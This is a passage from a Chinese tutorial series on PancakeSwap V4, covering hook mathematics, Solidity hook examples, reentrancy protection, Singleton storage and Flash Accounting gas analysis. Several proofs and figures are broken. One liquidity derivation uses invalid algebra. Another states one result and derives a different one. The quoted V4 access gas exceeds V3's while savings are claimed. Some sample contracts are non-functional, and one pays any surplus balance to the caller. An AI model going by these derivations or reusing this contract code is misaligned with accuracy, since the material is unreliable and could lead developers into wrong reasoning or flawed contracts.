amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external view returns (bytes memory) {\n        // 解析当前价格\n        uint160 currentSqrtPrice = getCurrentSqrtPrice();\n \n        // 计算新价格（简化模型）\n        uint160 newSqrtPrice = calculateNewSqrtPrice(\n            currentSqrtPrice,\n            amount0,\n            amount1\n        );\n \n        // 验证价格限制\n        if (amount0 &gt; 0) {  // selling token0, price decreases\n            require(\n                newSqrtPrice &gt;= sqrtPriceLimitX96,\n                &quot;Price limit exceeded&quot;\n            );\n        } else {  // selling token1, price increases\n            require(\n                newSqrtPrice &lt;= sqrtPriceLimitX96,\n                &quot;Price limit exceeded&quot;\n            );\n        }\n \n        return bytes(&quot;&quot;);\n    }\n \n    function calculateNewSqrtPrice(\n        uint160 currentSqrtPrice,\n        int256 amount0,\n        int256 amount1\n    ) internal pure returns (uint160) {\n        // 简化计算：假设恒定乘积\n        // Δx × P + Δy ≈ 0\n        // P = (√price)²\n \n        uint256 price = (uint256(currentSqrtPrice) * uint256(currentSqrtPrice)) &gt;&gt; 192;\n \n        int256 expectedAmount1;\n        if (amount0 &gt; 0) {\n            expectedAmount1 = -int256((uint256(amount0) * price) &gt;&gt; 96);\n        } else {\n            expectedAmount1 = int256((uint256(-amount0) &lt;&lt; 96) / price);\n        }\n \n        // 验证实际amount1与预期是否接近\n        // 允许一定的误差（由于流动性集中）\n        require(\n            abs(amount1 - expectedAmount1) &lt;= expectedAmount1 / 100,  // 1%误差\n            &quot;Invalid swap amounts&quot;\n        );\n \n        // 返回新价格（简化计算）\n        return currentSqrtPrice;\n    }\n \n    function abs(int256 x) internal pure returns (int256) {\n        return x &gt;= 0 ? x : -x;\n    }\n \n    function getCurrentSqrtPrice() internal view returns (uint160) {\n        // 从池子获取当前价格\n        // 实际实现需要访问池子状态\n        return 0;\n    }\n}\nafterSwap Hook\n数学模型：\nH_afterSwap: S × A₀ × A₁ × P_final → S&#039;&#039; × R\n\n其中：\n- S: Hook处理后的状态\n- A₀, A₁: 实际交换数量\n- P_final: 最终价格\n- S&#039;&#039;: 最终状态\n- R: 返回数据\n\n费用计算：\n交易费用fee需要按比例分配：\nfee_total = fee_input + fee_output\nfee_lp = fee_total × (1 - protocol_fee_rate)\nfee_protocol = fee_total × protocol_fee_rate\n\n按流动性分配给LP：\nfee_i_LP = fee_lp × (L_i / L_total)\n\n其中：\n- L_i: LP i的流动性\n- L_total: 总流动性\n\nHook实现示例：费用再分配：\ncontract FeeRedistributionHook {\n    mapping(address =&gt; uint256) public userFees;\n \n    function afterSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        int24 tick,\n        bytes calldata data\n    ) external returns (bytes memory) {\n        // 解析实际费用\n        (uint256 fee0, uint256 fee1) = decodeFees(data);\n \n        // 重新分配费用（例如：给推荐人分成）\n        address referrer = getReferrer(sender);\n \n        if (referrer != address(0)) {\n            uint256 referrerFee0 = fee0 / 10;  // 10%推荐奖励\n            uint256 referrerFee1 = fee1 / 10;\n \n            userFees[referrer] += referrerFee0;\n            userFees[referrer] += referrerFee1;\n        }\n \n        return bytes(&quot;&quot;);\n    }\n}\n2.3 Liquidity Hooks\nbeforeAddLiquidity / beforeRemoveLiquidity\n数学模型：\n添加流动性：\nH_beforeAddLiq: S × ΔL × (P_lower, P_upper) → S&#039; × ΔL&#039; × (P_lower&#039;, P_upper&#039;)\n\n其中：\n- ΔL: 添加的流动性数量\n- P_lower, P_upper: 价格区间\n\n流动性计算的数学推导：\n给定价格区间[Pa, Pb]和流动性L，所需代币数量：\n情况1：价格在区间下方 (P &lt; Pa)\n只需要token0：\nx = L / √Pb\n\n证明：\n\n在集中流动性模型中：\n(x + L/√Pb) × (y + L√Pa) = L²\n\n当 P &lt; Pa 时，y = 0（不需要token1）\n\n代入：\n(x + L/√Pb) × (0 + L√Pa) = L²\n⇒ x + L/√Pb = L / (L√Pa)\n⇒ x + L/√Pb = 1/√Pa\n⇒ x = 1/√Pa - L/√Pb\n⇒ x = L × (1/√Pa - 1/√Pb)\n\n证毕。\n\n情况2：价格在区间内 (Pa ≤ P ≤ Pb)\n需要两种代币：\nx = L × (1/√P - 1/√Pb)\ny = L × (√P - √Pa)\n\n证明：\n\n设当前价格为P，有：\n√P - √Pa = Δy / L  (1)\n1/√Pb - 1/√P = Δx / L  (2)\n\n从(1)：\nΔy = L × (√P - √Pa)\n\n从(2)：\nΔx = L × (1/√Pb - 1/√P)\n\n证毕。\n\n情况3：价格在区间上方 (P &gt; Pb)\n只需要token1：\ny = L × √Pa\n\n证明：\n\n当 P &gt; Pb 时，x = 0（不需要token0）\n\n代入集中流动性公式：\n(0 + L/√Pb) × (y + L√Pa) = L²\n⇒ L/√Pb × (y + L√Pa) = L²\n⇒ y + L√Pa = L × √Pb\n⇒ y = L × √Pb - L × √Pa\n⇒ y = L × (√Pb - √Pa)\n\n证毕。\n\nHook实现：流动性验证：\ncontract LiquidityValidationHook {\n    mapping(int24 =&gt; bool) public allowedTickLower;\n    mapping(int24 =&gt; bool) public allowedTickUpper;\n \n    function beforeAddLiquidity(\n        address sender,\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external view returns (bytes memory) {\n        // 验证tick范围是否允许\n        require(\n            allowedTickLower[tickLower],\n            &quot;Tick lower not allowed&quot;\n        );\n        require(\n            allowedTickUpper[tickUpper],\n            &quot;Tick upper not allowed&quot;\n        );\n \n        // 验证tick间距\n        int24 tickSpacing = getTickSpacing();\n        require(\n            tickLower % tickSpacing == 0,\n            &quot;Invalid tick lower spacing&quot;\n        );\n        require(\n            tickUpper % tickSpacing == 0,\n            &quot;Invalid tick upper spacing&quot;\n        );\n \n        return bytes(&quot;&quot;);\n    }\n}\nafterAddLiquidity / afterRemoveLiquidity\n数学模型：\nH_afterAddLiq: S&#039; × ΔL_final → S&#039;&#039; × M\n\n其中：\n- ΔL_final: 实际添加的流动性\n- M: 元数据（如NFT ID）\n\n2.4 Donate Hook\n数学模型：\nH_donate: S × D₀ × D₁ → S&#039;\n\n其中：\n- D₀, D₁: 捐赠的代币数量\n\nHook实现：捐赠奖励：\ncontract DonationRewardHook {\n    mapping(address =&gt; uint256) public rewards;\n \n    function beforeDonate(\n        address sender,\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external returns (bytes memory) {\n        // 给捐赠者奖励\n        uint256 reward = (amount0 + amount1) / 1000;  // 0.1%奖励\n        rewards[sender] += reward;\n \n        return bytes(&quot;&quot;);\n    }\n}\n\n3. Hooks的数学性质\n3.1 幂等性（Idempotency）\n定义：\n函数H是幂等的，当且仅当：\nH(H(s, x), x) = H(s, x)\n\n对所有s∈S, x∈X成立。\n\n示例：余额检查Hook\ncontract IdempotentHook {\n    mapping(address =&gt; uint256) public balances;\n \n    function updateBalance(address user, uint256 amount) external {\n        // 幂等操作：无论调用多少次，结果相同\n        balances[user] = amount;  // 覆盖而非累加\n    }\n}\n验证：\n设初始状态：balances[Alice] = 100\n\n第一次调用：updateBalance(Alice, 200)\n结果：balances[Alice] = 200\n\n第二次调用：updateBalance(Alice, 200)\n结果：balances[Alice] = 200  （相同）\n\n因此：H(H(100, 200), 200) = H(100, 200) = 200\n满足幂等性。\n\n3.2 可逆性（Reversibility）\n定义：\n函数H是可逆的，当且仅当存在逆函数H⁻¹：\nH⁻¹(H(s, x)) = s\n\n对所有s∈S, x∈X成立。\n\n示例：可逆的操作：\ncontract ReversibleHook {\n    mapping(address =&gt; uint256) public balances;\n \n    // 正向操作：增加余额\n    function addBalance(address user, uint256 amount) external {\n        balances[user] += amount;\n    }\n \n    // 逆向操作：减少余额\n    function subtractBalance(address user, uint256 amount) external {\n        balances[user] -= amount;\n    }\n}\n验证：\n设初始状态：balances[Alice] = 100\n\n正向操作：addBalance(Alice, 50)\n结果：balances[Alice] = 150\n\n逆向操作：subtractBalance(Alice, 50)\n结果：balances[Alice] = 100  （恢复初始状态）\n\n因此：H⁻¹(H(100, 50)) = 100\n满足可逆性。\n\n不可逆操作示例：\ncontract IrreversibleHook {\n    uint256 public counter;\n \n    function increment() external {\n        counter++;\n    }\n}\ncounter = 0\nincrement() → counter = 1\nincrement() → counter = 2\n\n无法通过操作将counter恢复到0\n因此该操作不可逆。\n\n3.3 结合律（Associativity）\n定义：\n对于Hook H1, H2, H3：\n(H3 ∘ H2) ∘ H1 = H3 ∘ (H2 ∘ H1)\n\n即：操作的顺序不影响最终结果（如果Hook之间无依赖）\n\n示例：独立的日志记录\ncontract AssociativeHook {\n    event Log1(uint256);\n    event Log2(uint256);\n    event Log3(uint256);\n \n    function log1(uint256 value) external {\n        emit Log1(value);\n    }\n \n    function log2(uint256 value) external {\n        emit Log2(value);\n    }\n \n    function log3(uint256 value) external {\n        emit Log3(value);\n    }\n}\n验证：\n初始状态：value = 10\n\n顺序1：(log3 ∘ log2) ∘ log1\nlog1(10) → emit Log1(10)\nlog2(10) → emit Log2(10)\nlog3(10) → emit Log3(10)\n\n顺序2：log3 ∘ (log2 ∘ log1)\nlog1(10) → emit Log1(10)\nlog2(10) → emit Log2(10)\nlog3(10) → emit Log3(10)\n\n结果相同，满足结合律。\n\n3.4 交换律（Commutativity）\n定义：\n对于Hook H1, H2：\nH2 ∘ H1 = H1 ∘ H2\n\n即：执行顺序不影响结果（通常不满足）\n\n交换律不满足的例子：\ncontract NonCommutativeHook {\n    uint256 public value;\n \n    function multiplyBy2() external {\n        value *= 2;\n    }\n \n    function add10() external {\n        value += 10;\n    }\n}\n验证：\n初始状态：value = 10\n\n顺序1：multiplyBy2 ∘ add10\nadd10() → value = 20\nmultiplyBy2() → value = 40\n\n顺序2：add10 ∘ multiplyBy2\nmultiplyBy2() → value = 20\nadd10() → value = 30\n\n40 ≠ 30\n\n因此不满足交换律。\n\n\n4. Hooks的状态机模型\n4.1 状态转移图\nstateDiagram-v2\n    [*] --&gt; Idle\n    Idle --&gt; PreSwap: beforeSwap\n    PreSwap --&gt; Swapping: 执行swap\n    Swapping --&gt; PostSwap: afterSwap\n    PostSwap --&gt; Idle: 完成\n\n    Idle --&gt; PreAddLiq: beforeAddLiquidity\n    PreAddLiq --&gt; Adding: 添加流动性\n    Adding --&gt; PostAddLiq: afterAddLiquidity\n    PostAddLiq --&gt; Idle: 完成\n\n    Idle --&gt; PreRemoveLiq: beforeRemoveLiquidity\n    PreRemoveLiq --&gt; Removing: 移除流动性\n    Removing --&gt; PostRemoveLiq: afterRemoveLiquidity\n    PostRemoveLiq --&gt; Idle: 完成\n\n    note right of PreSwap\n        验证参数\n        修改数量\n        计算费用\n    end note\n\n    note right of Swapping\n        执行AMM逻辑\n        更新价格\n    end note\n\n    note right of PostSwap\n        记录日志\n        分配奖励\n        更新统计\n    end note\n\n4.2 状态转移数学\n状态定义：\nS = {Idle, PreSwap, Swapping, PostSwap, PreAddLiq, Adding, PostAddLiq, ...}\n\n状态转移函数：\nT: S × A → S\n\n其中：\n- S: 状态集合\n- A: 动作集合\n\n转移矩阵：\n      Idle  PreSwap  Swap  PostSwap  ...\nIdle   0     1       0     0        ...\nPreSwap 0     0       1     0        ...\nSwap   0     0       0     1        ...\n...   ...   ...     ...   ...      ...\n\n其中：\nT(s, a) = s&#039; 表示从状态s通过动作a转移到状态s&#039;\n1表示可转移，0表示不可转移\n\n\n5. Hooks的安全性分析\n5.1 重入攻击防护\n问题场景：\nsequenceDiagram\n    participant Pool as PoolManager\n    participant Hook as 恶意Hook\n    participant User as 用户\n\n    User-&gt;&gt;Pool: swap()\n    Pool-&gt;&gt;Hook: beforeSwap()\n    Hook-&gt;&gt;Hook: 恶意逻辑\n    Hook-&gt;&gt;Pool: 再次调用swap()  重入\n    Pool-&gt;&gt;Pool: 状态未恢复\n\n防护机制：\n使用ReentrancyGuard模式：\ncontract ReentrancyGuardHook {\n    uint256 private _status;\n \n    uint256 private constant _NOT_ENTERED = 1;\n    uint256 private constant _ENTERED = 2;\n \n    modifier nonReentrant() {\n        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);\n        _status = _ENTERED;\n        _;\n        _status = _NOT_ENTERED;\n    }\n \n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external nonReentrant returns (bytes memory) {\n        // Hook逻辑\n        return bytes(&quot;&quot;);\n    }\n}\n5.2 状态不一致防护\n问题：Hook修改了状态，但Pool未感知\n解决方案：使用检查点\ncontract CheckpointHook {\n    uint256 public version;\n    mapping(uint256 =&gt; State) public checkpoints;\n \n    struct State {\n        uint256 balance;\n        uint256 timestamp;\n    }\n \n    modifier checkpoint() {\n        uint256 currentVersion = version;\n        State memory state = checkpoints[currentVersion];\n \n        _;  // 执行操作\n \n        // 检查状态一致性\n        require(\n            state.balance == checkpoints[currentVersion].balance,\n            &quot;State inconsistent&quot;\n        );\n    }\n}\n\n6. 本章小结\n6.1 Hooks数学模型总结\nmindmap\n  root((Hooks数学模型))\n    状态转换函数\n      S × X × Y × C → S&#039;\n      确定性\n      可选性\n      组合性\n    数学性质\n      幂等性\n      可逆性\n      结合律\n      交换律(不满足)\n    约束条件\n      价格范围\n      数值精度\n      流动性非负\n    安全性\n      重入防护\n      状态一致\n      边界检查\n\n6.2 关键公式速查\nHook定义：\nH: S × X × Y × C → S&#039;\n\n幂等性：\nH(H(s, x), x) = H(s, x)\n\n可逆性：\nH⁻¹(H(s, x)) = s\n\n流动性计算：\nx = L × (1/√Pa - 1/√Pb)\ny = L × (√Pb - √Pa)\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Singleton架构与Flash Accounting，包括：\n\nSingleton存储优化的数学推导\nFlash Accounting的数学原理\nGas节省的详细证明\n实际代码实现\n\n\n参考资料\n\nPancakeSwap V4 Hooks 文档\n函数式数学基础\n状态机理论\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/03-Singleton架构与FlashAccounting":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/03-Singleton架构与FlashAccounting","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/03-Singleton架构与FlashAccounting.md","title":"03-Singleton架构与FlashAccounting","links":[],"tags":[],"content":"死磕PancakeSwap V4（三）：Singleton架构与Flash Accounting\n\n本文是「死磕PancakeSwap V4」系列的第三篇，深入剖析Singleton架构的存储优化数学和Flash Accounting的闪电记账机制。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. Singleton架构深度剖析\n1.1 V3 vs V4架构对比\nV3架构分析\n存储模型：\nV3中有N个池子，每个池子独立合约：\n\nPool_1: {\n    storage_slot_1_1,\n    storage_slot_1_2,\n    ...\n    storage_slot_1_M\n}\n\nPool_2: {\n    storage_slot_2_1,\n    storage_slot_2_2,\n    ...\n    storage_slot_2_M\n}\n\n...\n\nPool_N: {\n    storage_slot_N_1,\n    storage_slot_N_2,\n    ...\n    storage_slot_N_M\n}\n\n总存储槽数：Total_V3 = N × M\n\n访问成本：\n访问Pool_i的数据：\nGas_V3_access = G_base + G_external_call + G_storage_read\n\n其中：\n- G_base: 基础成本（~2,100 gas）\n- G_external_call: 外部调用成本（~700 gas冷启动，~100 gas热启动）\n- G_storage_read: 存储读取成本（~2,100 gas冷，~100 gas热）\n\n总计：~4,900 gas（冷启动）\n\nV4 Singleton架构\n存储模型：\nV4中所有池子共享一个合约：\n\nSingleton: {\n    // 共享基础数据\n    shared_storage_1,\n    shared_storage_2,\n    ...,\n    shared_storage_S,\n\n    // 池子映射\n    mapping(uint256 =&gt; PoolData) pools,\n\n    // 索引数据\n    mapping(uint256 =&gt; uint256) poolIndex,\n}\n\nPoolData: {\n    pool_specific_1,\n    pool_specific_2,\n    ...,\n    pool_specific_P\n}\n\n总存储槽数：Total_V4 = S + N × P\n\n访问成本：\n访问Pool_i的数据：\nGas_V4_access = G_base + G_mapping_read + G_storage_read\n\n其中：\n- G_base: 基础成本（~2,100 gas）\n- G_mapping_read: 映射读取（~2,100 gas冷，~100 gas热）\n- G_storage_read: 存储读取（~2,100 gas冷，~100 gas热）\n\n总计：~6,300 gas（冷启动）\n\n1.2 存储优化数学推导\n定理1：存储节省\n定理：当满足条件时，V4比V3节省存储。\n证明：\n设：\n- N: 池子数量\n- M: V3单池存储槽数\n- S: V4共享存储槽数\n- P: V4单池差异数据槽数\n\nV3总存储：Storage_V3 = N × M\nV4总存储：Storage_V4 = S + N × P\n\n存储节省量：\nSavings = Storage_V3 - Storage_V4\n        = N × M - (S + N × P)\n        = N × M - S - N × P\n        = N × (M - P) - S\n\n节省比例：\nRatio = Savings / Storage_V3\n      = (N × (M - P) - S) / (N × M)\n      = (M - P) / M - S / (N × M)\n      = 1 - P/M - S/(N×M)\n\n当 N → ∞ 时：\nRatio → 1 - P/M\n\n因此，V4节省存储的充分条件是：\nP &lt; M  （差异数据少于总数据）\n\n证毕。\n\n数值示例：\n假设：\n\nM = 100 存储槽（V3单池）\nS = 50 存储槽（V4共享）\nP = 20 存储槽（V4差异）\n\n当 N = 1000 池子时：\nStorage_V3 = 1000 × 100 = 100,000 存储槽\nStorage_V4 = 50 + 1000 × 20 = 20,050 存储槽\n\nSavings = 100,000 - 20,050 = 79,950 存储槽\nRatio = 79,950 / 100,000 = 79.95%\n\n理论极限：\nRatio_max = 1 - P/M = 1 - 20/100 = 80%\n\n当 N = 10,000 池子时：\nStorage_V3 = 10,000 × 100 = 1,000,000 存储槽\nStorage_V4 = 50 + 10,000 × 20 = 200,050 存储槽\n\nSavings = 1,000,000 - 200,050 = 799,950 存储槽\nRatio = 799,950 / 1,000,000 = 79.995%\n\n更接近理论极限80%\n\n定理2：部署成本优化\n定理：V4的部署成本比V3低。\n证明：\n设：\n- Gas_deploy_V3_pool: V3单池部署成本\n- Gas_deploy_V4_singleton: V4 Singleton部署成本\n- Gas_deploy_V4_pool: V4创建池子成本\n\nV3总部署成本：\nGas_V3_deploy = N × Gas_deploy_V3_pool\n\nV4总部署成本：\nGas_V4_deploy = Gas_deploy_V4_singleton + N × Gas_deploy_V4_pool\n\n需要证明：\nGas_V4_deploy &lt; Gas_V3_deploy\n⇔ Gas_deploy_V4_singleton + N × Gas_deploy_V4_pool &lt; N × Gas_deploy_V3_pool\n⇔ Gas_deploy_V4_singleton &lt; N × (Gas_deploy_V3_pool - Gas_deploy_V4_pool)\n\n根据实际数据：\nGas_deploy_V3_pool ≈ 2,000,000 gas\nGas_deploy_V4_singleton ≈ 1,000,000 gas\nGas_deploy_V4_pool ≈ 150,000 gas\n\n当 N ≥ 1 时：\nRHS = N × (2,000,000 - 150,000) = N × 1,850,000\n\n对于 N = 1：\nRHS = 1 × 1,850,000 = 1,850,000\nLHS = 1,000,000\n1,000,000 &lt; 1,850,000 ✓\n\n对于任何 N ≥ 1：\nLHS = 1,000,000\nRHS ≥ 1,850,000\n1,000,000 &lt; RHS ✓\n\n证毕。\n\n数值示例：\n当 N = 1000 池子时：\nGas_V3_deploy = 1000 × 2,000,000 = 2,000,000,000 gas\nGas_V4_deploy = 1,000,000 + 1000 × 150,000 = 151,000,000 gas\n\n节省 = 2,000,000,000 - 151,000,000 = 1,849,000,000 gas\n节省比例 = 1,849,000,000 / 2,000,000,000 = 92.45%\n\n以当前gas价格30 gwei计算：\n节省的eth = 1,849,000,000 × 30 / 10^9 = 55.47 ETH\n以当前eth价格$2000计算：\n节省的usd = 55.47 × 2000 = $110,940\n\n1.3 Singleton的数据布局优化\n存储槽打包\nV3布局（分散）：\n// Pool合约中\nstruct Slot0 {\n    uint160 sqrtPriceX96;  // 160 bits\n    int24 tick;             // 24 bits\n    uint16 observationIndex; // 16 bits\n    uint16 observationCardinality; // 16 bits\n    uint16 observationCardinalityNext; // 16 bits\n    uint8 feeProtocol;      // 8 bits\n    bool unlocked;           // 1 bit\n    // 剩余15 bits填充\n}\n \n// 使用256位存储槽\nSlot0 public slot0;  // 1个存储槽\nV4布局（集中优化）：\ncontract PancakeV4PoolManager {\n    // 全局共享数据（紧密打包）\n    struct GlobalState {\n        uint32 blockTimestamp;\n        uint16 poolCount;\n        uint16 observationCardinality;\n        uint8 flags;\n        uint8 padding;\n    }\n \n    GlobalState public globalState;  // 1个存储槽\n \n    // 池子数据（结构优化）\n    struct PoolData {\n        // 价格和流动性（紧密打包）\n        uint160 sqrtPriceX96;   // 160 bits\n        int24 tick;              // 24 bits\n        uint128 liquidity;      // 128 bits\n \n        // 索引和观察（打包到另一个槽）\n        uint16 observationIndex; // 16 bits\n        uint32 lastUpdated;      // 32 bits\n        // 剩余208 bits可用于其他数据\n    }\n \n    mapping(uint256 =&gt; PoolData) public pools;\n}\n存储对比：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n数据类型V3存储槽数V4存储槽数优化全局状态N × 11N-1池子数据N × MN × PN×(M-P)总计N×M+11+N×PN×(M-P)+N-1\n假设N=1000, M=10, P=8：\nV3: 1000 × 10 + 1 = 10,001 存储槽\nV4: 1 + 1000 × 8 = 8,001 存储槽\n\n节省：2,000 存储槽 (20%)\n\n\n2. Flash Accounting机制详解\n2.1 传统记账的问题\nV3传统记账流程\nsequenceDiagram\n    participant User as 用户\n    participant Pool as 池子\n    participant Token0 as Token0\n    participant Token1 as Token1\n\n    User-&gt;&gt;Pool: swap(amountIn)\n    Pool-&gt;&gt;Token0: transferFrom(amountIn)\n    Note over Token0: Gas: ~50,000\n\n    Pool-&gt;&gt;Pool: 计算swap\n    Pool-&gt;&gt;Token1: transfer(amountOut)\n    Note over Token1: Gas: ~50,000\n\n    Pool-&gt;&gt;Pool: 更新状态\n\n    Note over Pool: 总Gas: ~100,000&lt;br/&gt;仅转账操作\n\nGas成本分析：\n单次swap操作（2个代币）：\n\n1. transferFrom(inputToken, amountIn):\n   - 检查allowance: ~2,100 gas\n   - 扣除余额: ~2,500 gas\n   - 增加余额: ~2,500 gas\n   - 触发Transfer事件: ~1,000 gas\n   - 总计: ~8,100 gas\n\n2. calculateSwap():\n   - 计算价格: ~5,000 gas\n   - 更新流动性: ~3,000 gas\n   - 总计: ~8,000 gas\n\n3. transfer(outputToken, amountOut):\n   - 检查余额: ~2,100 gas\n   - 扣除余额: ~2,500 gas\n   - 增加余额: ~2,500 gas\n   - 触发Transfer事件: ~1,000 gas\n   - 总计: ~8,100 gas\n\n4. updateState():\n   - 更新存储: ~2,500 gas\n   - 触发Swap事件: ~1,500 gas\n   - 总计: ~4,000 gas\n\n总计：8,100 + 8,000 + 8,100 + 4,000 = 28,200 gas\n\n考虑热启动和优化：~20,000 gas\n考虑冷启动：~50,000+ gas\n\n2.2 Flash Accounting原理\n核心思想\n传统记账：每次转账立即执行\nFlash Accounting：先记录变化，最后统一结算\n数学模型：\n设：\n- B_i^initial: t=0时代币i的余额\n- B_i^final: t=T时代币i的余额\n- ΔB_i: 代币i的净变化\n\nFlash Accounting:\nΔB_i = B_i^final - B_i^initial\n\n结算条件：\n1. 净价值守恒（套利）:\n   Σ(ΔB_i × P_i) = 0\n\n2. 非负约束（一般交易）:\n   ΔB_i ≥ 0, ∀i\n\n其中：\n- P_i: 代币i的价格（以某个计价单位）\n\nFlash Accounting流程\nsequenceDiagram\n    participant User as 用户\n    participant Pool as PoolManager\n    participant Tokens as 代币合约\n\n    User-&gt;&gt;Pool: swap(amountIn) + 支付代币\n    Pool-&gt;&gt;Pool: recordInitialBalance()\n\n    loop 对每个代币\n        Pool-&gt;&gt;Pool: 记录初始余额\n    end\n\n    Pool-&gt;&gt;Pool: 执行swap逻辑\n    Note over Pool: 期间不进行转账\n\n    Pool-&gt;&gt;Pool: recordFinalBalance()\n\n    loop 对每个代币\n        Pool-&gt;&gt;Pool: 记录最终余额\n    end\n\n    Pool-&gt;&gt;Pool: calculateNetChange()\n\n    Pool-&gt;&gt;Pool: settle()\n\n    loop 对每个有变化的代币\n        Pool-&gt;&gt;Tokens: 批量转账\n        Note over Tokens: 优化后Gas: ~15,000/代币\n    end\n\n    Note over Pool: 总Gas: ~60,000&lt;br/&gt;节省约40%\n\n2.3 Flash Accounting数学推导\n定理3：Flash Accounting节省gas\n定理：Flash Accounting相比传统记账节省gas。\n证明：\n设：\n- n: 涉及的代币数量\n- G_transfer: 单次转账gas成本\n- G_balance: 查询余额gas成本\n- k: 查询成本占转账成本的比例\n  G_balance = k × G_transfer\n  实际中 k ≈ 0.1\n\n传统记账成本：\nGas_traditional = n × G_transfer  (输入)\n                  + n × G_transfer  (输出)\n                  + G_logic  (核心逻辑）\n                = 2n × G_transfer + G_logic\n\nFlash Accounting成本：\nGas_flash = n × G_balance  (初始查询)\n           + n × G_balance  (最终查询)\n           + n × G_transfer  (一次性转账）\n           + G_logic\n         = 2n × G_balance + n × G_transfer + G_logic\n\n节省量：\nSavings = Gas_traditional - Gas_flash\n        = (2n × G_transfer + G_logic) - (2n × G_balance + n × G_transfer + G_logic)\n        = 2n × G_transfer - 2n × G_balance - n × G_transfer\n        = n × G_transfer - 2n × G_balance\n        = n × G_transfer × (1 - 2k)\n\n节省比例：\nRatio = Savings / Gas_traditional\n      = (n × G_transfer × (1 - 2k)) / (2n × G_transfer + G_logic)\n\n当 G_logic &lt;&lt; n × G_transfer（核心逻辑成本远小于转账成本）时：\nRatio ≈ (1 - 2k) / 2\n      = 0.5 - k\n\n代入 k ≈ 0.1：\nRatio ≈ 0.5 - 0.1 = 0.4 = 40%\n\n证毕。\n\n数值验证：\n假设：\n\nn = 2（两个代币）\nG_transfer = 8,100 gas\nG_balance = 810 gas (k=0.1)\nG_logic = 10,000 gas\n\n传统记账：\nGas_traditional = 2 × 2 × 8,100 + 10,000 = 32,400 + 10,000 = 42,400 gas\n\nFlash Accounting：\nGas_flash = 2 × 2 × 810 + 2 × 8,100 + 10,000\n          = 3,240 + 16,200 + 10,000\n          = 29,440 gas\n\n节省：\nSavings = 42,400 - 29,440 = 12,960 gas\nRatio = 12,960 / 42,400 = 30.6%\n\n接近理论值40%（因为G_logic不可忽略）\n\n定理4：Flash Accounting安全性\n定理：Flash Accounting能防止余额异常。\n证明：\n定义异常条件：\n余额异常：B_i^final &lt; B_i^tracked  （实际余额小于追踪余额）\n\nFlash Accounting检查：\n1. 初始：B_i^tracked(0) = B_i(0)  （初始化时记录）\n\n2. 执行期间：不进行转账，不更新B_i^tracked\n\n3. 最终检查：\n   要求：B_i(T) ≥ B_i^tracked(0)\n\n4. 结算：\n   ΔB_i = B_i(T) - B_i^tracked(0)\n   转账：transfer(ΔB_i)\n\n假设存在余额异常（反证法）：\n\n如果在结算时 B_i(T) &lt; B_i^tracked(0)：\n则 ΔB_i = B_i(T) - B_i^tracked(0) &lt; 0\n\n转账 amount &lt; 0，这会导致：\n1. 检查失败：require(amount &gt;= 0)\n2. 或者 revert\n\n因此，Flash Accounting必然在结算时检测到余额异常并拒绝操作。\n\n证毕。\n\n2.4 Flash Accounting实现\n核心数据结构\ncontract PancakeV4PoolManager {\n    // 余额追踪\n    struct BalanceCheckpoint {\n        mapping(address =&gt; uint256) tokens;\n        uint256 eth;\n        uint256 timestamp;\n    }\n \n    // 当前和检查点\n    BalanceCheckpoint public currentBalance;\n    BalanceCheckpoint public checkpoint;\n \n    // 活跃代币\n    address[] public activeTokens;\n \n    // 检查点状态\n    bool private inFlashAccounting;\n}\n记录初始余额\nfunction _recordInitialBalance() internal {\n    // 记录ETH余额\n    checkpoint.eth = address(this).balance;\n \n    // 记录所有活跃代币的余额\n    for (uint256 i = 0; i &lt; activeTokens.length; i++) {\n        address token = activeTokens[i];\n        checkpoint.tokens[token] = IERC20(token).balanceOf(address(this));\n    }\n \n    checkpoint.timestamp = block.timestamp;\n    inFlashAccounting = true;\n}\n记录最终余额并结算\nfunction _settle() internal {\n    require(inFlashAccounting, &quot;Not in flash accounting&quot;);\n \n    // 计算ETH净变化\n    uint256 currentEth = address(this).balance;\n    int256 ethDelta = int256(currentEth) - int256(checkpoint.eth);\n \n    // 计算每个代币的净变化\n    for (uint256 i = 0; i &lt; activeTokens.length; i++) {\n        address token = activeTokens[i];\n        uint256 currentBalance = IERC20(token).balanceOf(address(this));\n        uint256 trackedBalance = checkpoint.tokens[token];\n \n        require(\n            currentBalance &gt;= trackedBalance,\n            &quot;Balance deficit&quot;\n        );\n \n        uint256 delta = currentBalance - trackedBalance;\n \n        if (delta &gt; 0) {\n            // 向用户转账\n            SafeERC20.safeTransfer(token, msg.sender, delta);\n        }\n    }\n \n    // 处理ETH变化\n    if (ethDelta &gt; 0) {\n        payable(msg.sender).transfer(uint256(ethDelta));\n    }\n \n    // 重置状态\n    inFlashAccounting = false;\n    delete checkpoint;\n}\n\n3. 综合优化效果分析\n3.1 整体Gas节省\nSwap操作优化\n传统V3 swap:\n- 读取池子状态：~2,100 gas\n- 调用池子合约：~700 gas\n- TransferFrom(input): ~8,100 gas\n- 计算swap：~8,000 gas\n- Transfer(output): ~8,100 gas\n- 更新状态：~4,000 gas\n- 返回：~2,000 gas\n总计：~33,000 gas\n\nV4 swap:\n- 